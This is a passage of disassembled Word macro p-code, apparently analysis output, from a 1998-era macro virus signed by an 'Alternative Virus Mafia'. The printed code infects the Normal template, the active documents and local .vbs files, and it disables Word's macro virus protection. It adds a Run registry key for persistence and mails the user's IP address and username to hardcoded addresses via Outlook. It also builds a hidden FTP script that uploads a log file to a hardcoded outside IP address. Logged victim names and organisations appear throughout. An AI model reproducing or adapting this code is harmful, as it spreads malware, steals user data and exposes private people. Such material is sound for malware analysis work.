' 	LitStr 0x001A "IV3 = Mid(IV9, x, 1) + IV3"
' 	PrintItemNL 
' Line #75:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Next"
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "For y = 1 To (XR + 4)"
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "For Each Target In IV6.GetFolder(IV5(y)).Files"
' 	PrintItemNL 
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "If UCase(Right(Target.Name, 3)) = "VBS" Then"
' 	PrintItemNL 
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "IV11 = """
' 	PrintItemNL 
' Line #81:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "Set TS = IV6.OpenTextFile(IV5(y) & Target.Name, 1)"
' 	PrintItemNL 
' Line #82:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "IV11 = TS.ReadAll"
' 	PrintItemNL 
' Line #83:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "TS.Close"
' 	PrintItemNL 
' Line #84:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "If mid(IV11,(len(IV11)-2),1) <> "¥" Then"
' 	PrintItemNL 
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "Set TS = IV6.OpenTextFile(IV5(y) & Target.Name, 8)"
' 	PrintItemNL 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "TS.Write IV3"
' 	PrintItemNL 
' Line #87:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "TS.Close"
' 	PrintItemNL 
' Line #88:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #89:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #90:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Next"
' 	PrintItemNL 
' Line #91:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Next"
' 	PrintItemNL 
' Line #92:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "FIV11 (IV7)"
' 	PrintItemNL 
' Line #93:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "If T111 = False Then"
' 	PrintItemNL 
' Line #94:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x005D "WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AVM", IV7"
' 	PrintItemNL 
' Line #95:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "Set U187 = IV6.OpenTextFile(IV7, 2, True)"
' 	PrintItemNL 
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "U187.Write IV3"
' 	PrintItemNL 
' Line #97:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "U187.Close"
' 	PrintItemNL 
' Line #98:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #99:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "Function FIV11(filespec)"
' 	PrintItemNL 
' Line #100:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "Set IV6 = CreateObject("Scripting.FileSystemObject")"
' 	PrintItemNL 
' Line #101:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "If (IV6.FileExists(filespec)) Then"
' 	PrintItemNL 
' Line #102:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "T111 = True"
' 	PrintItemNL 
' Line #103:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Else"
' 	PrintItemNL 
' Line #104:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "T111 = False"
' 	PrintItemNL 
' Line #105:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "End Function"
' 	PrintItemNL 
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x005C "' Nick "The Love Monkey" Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia"
' 	PrintItemNL 
' Line #108:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "'¥"
' 	PrintItemNL 
' Line #109:
' 	LitStr 0x0004 "Done"
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x0007 "AVM-VBS"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #110:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #111:
' 	LitStr 0x0014 "wscript c:\happy.vbs"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	Ld SIY 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld GoOk 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #114:
' 	LitStr 0x0009 "c:\A4.vbs"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #115:
' 	LitStr 0x0009 "c:\A4.vbs"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #116:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "Dim theApp, theNameSpace, theMailItem"
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "Dim IPSocket"
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error Resume Next"
' 	PrintItemNL 
' Line #119:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0030 "Set IPSocket = CreateObject("MSWinsock.Winsock")"
' 	PrintItemNL 
' Line #120:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "IPADDY = IPSocket.LocalIP"
' 	PrintItemNL 
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "set BOB = CreateObject("Wscript.Network")"
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "For x = 1 To 2"
' 	PrintItemNL 
' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004F "If x = 1 Then EMADDY = "avm@redneck.efga.org" Else EMADDY = "nick@virusbtn.com""
' 	PrintItemNL 
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "if x = 1 then MSGBDY = IPADDY & "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld gen 
' 	ArgsLd Str 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0029 " else MSGBDY = "Dear Nicky... my name is "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0043 " and I want to make hot monkey love with you. You anti-virus stud!""
' 	Concat 
' 	PrintItemNL 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0038 "Set theApp = WScript.CreateObject("Outlook.Application")"
' 	PrintItemNL 
' Line #126:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "Set theNameSpace = theApp.GetNameSpace("MAPI")"
' 	PrintItemNL 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "theNameSpace.Logon "profile", "password""
' 	PrintItemNL 
' Line #128:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "Set theMailItem = theApp.CreateItem(0)"
' 	PrintItemNL 
' Line #129:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "theMailItem.Recipients.Add EMADDY"
' 	PrintItemNL 
' Line #130:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "theMailItem.Subject = BOB.Username"
' 	PrintItemNL 
' Line #131:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "theMailItem.Body = MSGBDY"
' 	PrintItemNL 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "theMailItem.Send"
' 	PrintItemNL 
' Line #133:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "theNameSpace.Logoff"
' 	PrintItemNL 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Next"
' 	PrintItemNL 
' Line #135:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #136:
' 	EndIfBlock 
' Line #137:
' 	LitStr 0x0011 "wscript c:\a4.vbs"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #138:
' 	EndIfBlock 
' Line #139:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld a 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld a 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #140:
' 	QuoteRem 0x0000 0x005E " Nick "The Love Monkey" v2 Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia"
' Line #141:
' 	QuoteRem 0x0000 0x0039 "Hugh G. Rection Loves Nicky F. Also! 11/14/98 10:56:30 AM"
' Line #142:
' 	QuoteRem 0x0000 0x0032 "Biacuone Loves Nicky F. Also! 11/18/98 12:48:59 PM"
' Line #143:
' 	QuoteRem 0x0000 0x0032 "cmurthy Loves Nicky F. Also! 14-12-1998 9:45:26 AM"
' Line #144:
' 	QuoteRem 0x0000 0x0033 "beastman Loves Nicky F. Also! 12-01-1999 3:57:50 PM"
' Line #145:
' 	QuoteRem 0x0000 0x0038 "Krishna Kumar Loves Nicky F. Also! 19-01-1999 3:43:22 PM"
' Line #146:
' 	QuoteRem 0x0000 0x0033 "gaddison Loves Nicky F. Also! 15-02-1999 8:29:10 AM"
' Line #147:
' 	QuoteRem 0x0000 0x0036 "Claire Hamilton  Loves Nicky F. Also! 2/03/99 16:35:56"
' Line #148:
' 	QuoteRem 0x0000 0x003E "Yarra Valley Water Ltd Loves Nicky F. Also! 9/03/1999 14:41:41"
' Line #149:
' 	QuoteRem 0x0000 0x0037 "Kerrie Robertson Loves Nicky F. Also! 10/03/99 13:35:58"
' Line #150:
' 	EndSub 
' Line #151:
' 	FuncDefn (Private Sub Document_New())
' Line #152:
' Line #153:
' 	QuoteRem 0x0000 0x003F "Yarra Valley Water Ltd Loves Nicky F. Also! 22/03/1999 12:32:58"
' Line #154:
' 	QuoteRem 0x0000 0x002D "YMP137 Loves Nicky F. Also! 4/8/99 8:17:35 PM"
' Line #155:
' 	QuoteRem 0x0000 0x0037 "Staff Use Only Loves Nicky F. Also! 4/21/99 10:25:43 AM"
' Line #156:
' 	QuoteRem 0x0000 0x003D "Spiros Lefteriotis Loves Nicky F. Also! 04-May-99 10:25:17 PM"
' Line #157:
' 	QuoteRem 0x0000 0x0040 "Building M Open Access Lab Loves Nicky F. Also! 6/05/99 10:46:11"
' Line #158:
' 	QuoteRem 0x0000 0x0031 "Andrew Ly Loves Nicky F. Also! 5/9/99 10:22:32 AM"
' Line #159:
' 	QuoteRem 0x0000 0x0031 "Business Loves Nicky F. Also! 5/14/99 11:08:54 AM"
' Line #160:
' 	EndSub 
' Line #161:
' 	FuncDefn (Private Sub Document_Close())
' Line #162:
' Line #163:
' 	OnError (Resume Next) 
' Line #164:
' Line #165:
' 	Dim (Const) 
' 	LitStr 0x0014 "<- this is a marker!"
' 	VarDefn Marker
' Line #166:
' Line #167:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #168:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #169:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #170:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #171:
' Line #172:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #173:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #174:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #175:
' Line #176:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #177:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #178:
' Line #179:
' Line #180:
' 	QuoteRem 0x0000 0x001E "Switch the VirusProtection OFF"
' Line #181:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #182:
' Line #183:
' Line #184:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #185:
' Line #186:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #187:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #188:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #189:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #190:
' 	EndIfBlock 
' Line #191:
' Line #192:
' 	Ld LogData 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Ld LogData 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St LogData 
' Line #193:
' Line #194:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #195:
' 	Ld LogFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St LogFile 
' Line #196:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #197:
' 	LitStr 0x0006 "C:\hsf"
' 	Ld LogFile 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	St LogFile 
' Line #198:
' Line #199:
' 	Ld LogFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #200:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld LogData 
' 	PrintItemNL 
' Line #201:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #202:
' Line #203:
' 	LitStr 0x000D "c:\netldx.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #204:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "o 209.201.88.110"
' 	PrintItemNL 
' Line #205:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "user anonymous"
' 	PrintItemNL 
' Line #206:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pass itsme@"
' 	PrintItemNL 
' Line #207:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "cd incoming"
' 	PrintItemNL 
' Line #208:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "ascii"
' 	PrintItemNL 
' Line #209:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld LogFile 
' 	Concat 
' 	PrintItemNL 
' Line #210:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #211:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #212:
' Line #213:
' 	LitStr 0x002A "command.com /c ftp.exe -n -s:c:\netldx.vxd"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #214:
' Line #215:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #216:
' Line #217:
' 	EndIfBlock 
' Line #218:
' Line #219:
' Line #220:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #221:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #222:
' Line #223:
' Line #224:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #225:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #226:
' Line #227:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #228:
' Line #229:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #230:
' Line #231:
' Line #232:
' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
' Line #233:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #234:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #235:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #236:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #237:
' 	EndIfBlock 
' Line #238:
' 	ElseBlock 
' Line #239:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #240:
' 	EndIfBlock 
' Line #241:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #242:
' Line #243:
' 	LineCont 0x0010 09 00 0E 00 12 00 15 00 1E 00 0E 00 29 00 0E 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #244:
' Line #245:
' Line #246:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #247:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #248:
' Line #249:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #250:
' Line #251:
' 	EndIfBlock 
' Line #252:
' Line #253:
' Line #254:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #255:
' 	LineCont 0x0008 05 00 05 00 13 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #256:
' Line #257:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #258:
' Line #259:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #260:
' Line #261:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #262:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #263:
' Line #264:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #265:
' Line #266:
' 	EndIfBlock 
' Line #267:
' Line #268:
' Line #269:
' 	EndIfBlock 
' Line #270:
' Line #271:
' 	EndSub 
' Line #272:
' Line #273:
' 	QuoteRem 0x0000 0x000C " Logfile -->"
' Line #274:
' Line #275:
' 	QuoteRem 0x0000 0x0022 " 09:08:36  - Saturday, 28 Nov 1998"
' Line #276:
' 	QuoteRem 0x0000 0x0007 " SPo0Ky"
' Line #277:
' 	QuoteRem 0x0000 0x000C " Blue Planet"
' Line #278:
' 	QuoteRem 0x0000 0x0000 ""
' Line #279:
' Line #280:
' Line #281:
' Line #282:
' 	QuoteRem 0x0000 0x0024 " 02:50:31 PM - Saturday, 28 Nov 1998"
' Line #283:
' 	QuoteRem 0x0000 0x000D " MARK B. SEAY"
' Line #284:
' 	QuoteRem 0x0000 0x0000 ""
' Line #285:
' Line #286:
' Line #287:
' Line #288:
' 	QuoteRem 0x0000 0x0021 " 08:04:45 AM - Friday, 4 Dec 1998"
' Line #289:
' 	QuoteRem 0x0000 0x0004 " UPS"
' Line #290:
' 	QuoteRem 0x0000 0x0000 ""
' Line #291:
' Line #292:
' Line #293:
' Line #294:
' 	QuoteRem 0x0000 0x0024 " 11:43:35 AM - Thursday, 17 Dec 1998"
' Line #295:
' 	QuoteRem 0x0000 0x0004 " WRO"
' Line #296:
' 	QuoteRem 0x0000 0x0000 ""
' Line #297:
' Line #298:
' Line #299:
' Line #300:
' 	QuoteRem 0x0000 0x0023 " 11:37:56 AM - Tuesday, 29 Dec 1998"
' Line #301:
' 	QuoteRem 0x0000 0x0009 " Dan Ross"
' Line #302:
' 	QuoteRem 0x0000 0x0000 ""
' Line #303:
' Line #304:
' Line #305:
' Line #306:
' 	QuoteRem 0x0000 0x0022 " 09:50:06 AM - Monday, 11 Jan 1999"
' Line #307:
' 	QuoteRem 0x0000 0x000F " Karen M. Pinks"
' Line #308:
' 	QuoteRem 0x0000 0x0000 ""
' Line #309:
' Line #310:
' Line #311:
' Line #312:
' 	QuoteRem 0x0000 0x0024 " 04:41:03 PM - Thursday, 21 Jan 1999"
' Line #313:
' 	QuoteRem 0x0000 0x0013 " george w. connelly"
' Line #314:
' 	QuoteRem 0x0000 0x0000 ""
' Line #315:
' Line #316:
' Line #317:
' Line #318:
' 	QuoteRem 0x0000 0x0023 " 06:35:17 PM - Tuesday, 26 Jan 1999"
' Line #319:
' 	QuoteRem 0x0000 0x000F " lynn ann casey"
' Line #320:
' 	QuoteRem 0x0000 0x0000 ""
' Line #321:
' Line #322:
' Line #323:
' Line #324:
' 	QuoteRem 0x0000 0x0023 " 10:10:39  - Wednesday, 27 Jan 1999"
' Line #325:
' 	QuoteRem 0x0000 0x000B " Jo Baldock"
' Line #326:
' 	QuoteRem 0x0000 0x0000 ""
' Line #327:
' Line #328:
' Line #329:
' Line #330:
' 	QuoteRem 0x0000 0x0021 " 10:49:33 AM - Monday, 1 Feb 1999"
' Line #331:
' 	QuoteRem 0x0000 0x0012 " Richard P. Panico"
' Line #332:
' 	QuoteRem 0x0000 0x0000 ""
' Line #333:
' Line #334:
' Line #335:
' Line #336:
' 	QuoteRem 0x0000 0x0024 " 05:11:22 PM - Wednesday, 3 Feb 1999"
' Line #337:
' 	QuoteRem 0x0000 0x0015 " Jennifer A. Johnsonj"
' Line #338:
' 	QuoteRem 0x0000 0x0000 ""
' Line #339:
' Line #340:
' Line #341:
' Line #342:
' 	QuoteRem 0x0000 0x0020 " 02:03:10  - Tuesday, 9 Feb 1999"
' Line #343:
' 	QuoteRem 0x0000 0x0010 " Coles Myer Ltd."
' Line #344:
' 	QuoteRem 0x0000 0x0000 ""
' Line #345:
' Line #346:
' Line #347:
' Line #348:
' 	QuoteRem 0x0000 0x0023 " 05:05:46  - Wednesday, 10 Feb 1999"
' Line #349:
' 	QuoteRem 0x0000 0x0010 " Coles Myer Ltd."
' Line #350:
' 	QuoteRem 0x0000 0x0000 ""
' Line #351:
